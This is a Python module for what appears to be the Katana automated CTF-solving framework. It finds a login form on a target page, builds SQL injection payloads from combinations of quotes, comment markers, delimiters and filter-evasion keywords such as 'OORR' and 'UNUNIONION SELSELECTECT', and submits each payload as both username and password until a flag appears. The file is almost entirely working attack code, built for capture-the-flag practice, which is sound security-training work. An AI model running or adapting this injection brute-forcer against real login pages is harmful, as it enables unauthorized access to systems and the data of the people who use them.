from katana.unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
from katana.units import raw
import re
from katana.units import web
import requests
import magic
from katana import units

class Unit(web.WebUnit):

	PRIORITY = 25

	def __init__(self, katana, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable('no flag format supplied')

		# raw_content = self.target.content.decode('utf-8')
		
		self.action = re.findall(rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]', self.target.content, flags=re.IGNORECASE)
		self.method = re.findall(rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]', self.target.content, flags=re.IGNORECASE)

		self.username = re.findall(web.user_regex, self.target.content, flags=re.IGNORECASE)
		self.password = re.findall(web.pass_regex, self.target.content, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable('no form found')


	def enumerate(self, katana):
		
		# This should "yield 'name', (params,to,pass,to,evaluate)"
		# evaluate will see this second argument as only one variable and you will need to parse them out
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0].decode('utf-8')
			if self.method: method = self.method[0].decode('utf-8')
			if self.username: username = self.username[0].decode('utf-8')
			if self.password: password = self.password[0].decode('utf-8')

			try:
				method = vars(requests)[method.lower()]
			except IndexError:
				log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
				method = requests.post

			quotes_possibilities = [ "'", '"' ]
			comment_possibilities = [ "--", '#', '/*', '%00' ]
			delimeter_possibilities = [ ' ', '/**/' ]
			test_possibilities = [ 'OR', 'OORR', 'UNION SELECT', 'UNUNIONION SELSELECTECT' ]

			payloads = []
			count_attempt = 0
			for quote in quotes_possibilities:
				for comment in comment_possibilities:
					for delimeter in delimeter_possibilities:
						for test in test_possibilities:

							payload = quote + delimeter + test.replace(' ', delimeter) + delimeter + '1' + delimeter + comment
							count_attempt += 1
							yield (method, action, username, password, payload)

		else:
			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, katana, case):
		# Split up the target (see get_cases)
		method, action, username, password, payload = case
		
		# print("trying ", self.target, method, action, username, password)
		url_form = self.target.upstream.decode('utf-8').split('/')
		if len(url_form) > 3:
			last_location = '/'.join(url_form[:-1]) + '/'
		else:
			last_location = self.target.upstream.decode('utf-8').rstrip('/') + '/'

		try:
			r = method(last_location + action,
			 data = { username: payload, password : payload }, timeout=2, 
			 headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0'})
		except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
			# We can't reach the site... stop!
			return
		
		# Hunt for flags. If we found one, stop all other requests!
		hit = katana.locate_flags(self, r.text)

		if hit:
			self.completed = True
			return

		# You should ONLY return what is "interesting" 
		# Since we cannot gauge the results of this payload versus the others,
		# we will only care if we found the flag.
		return None